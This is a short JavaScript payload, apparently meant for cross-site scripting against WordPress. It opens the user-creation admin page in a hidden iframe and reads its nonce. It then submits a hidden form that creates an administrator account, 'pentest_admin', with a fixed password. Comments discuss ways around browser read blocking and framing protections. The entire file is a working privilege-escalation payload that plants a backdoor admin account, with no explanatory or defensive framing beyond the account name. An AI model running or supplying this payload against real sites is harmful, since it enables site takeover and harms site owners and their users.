(function() {
    // 1. Create a hidden container
    const div = document.createElement('div');
    div.style.display = 'none';
    document.body.appendChild(div);

    // 2. We still need the nonce. If ORB blocks the 'fetch' read, 
    // we use a "Hidden Iframe Form" technique.
    const ifr = document.createElement('iframe');
    ifr.src = '/wp-admin/user-new.php';
    div.appendChild(ifr);

    ifr.onload = function() {
        try {
            const adminDoc = ifr.contentDocument || ifr.contentWindow.document;
            const nonce = adminDoc.querySelector('#_wpnonce_create-user').value;

            // 3. Instead of 'fetching', we create a REAL form inside the page
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = '/wp-admin/user-new.php';

            const fields = {
                'action': 'createuser',
                '_wpnonce_create-user': nonce,
                '_wp_http_referer': '/wp-admin/user-new.php',
                'user_login': 'pentest_admin',
                'email': 'test@example.com',
                'pass1': 'P@ssword123!',
                'pass2': 'P@ssword123!',
                'role': 'administrator',
                'createuser': 'Add New User'
            };

            for (const name in fields) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = name;
                input.value = fields[name];
                form.appendChild(input);
            }

            // 4. Submit the form
            document.body.appendChild(form);
            form.submit();
            
        } catch (e) {
            // If the iframe is STILL blocked from being read, 
            // the vulnerability is likely restricted by 'X-Frame-Options: DENY'
            console.error("Critical Security Block: ", e);
        }
    };
})();
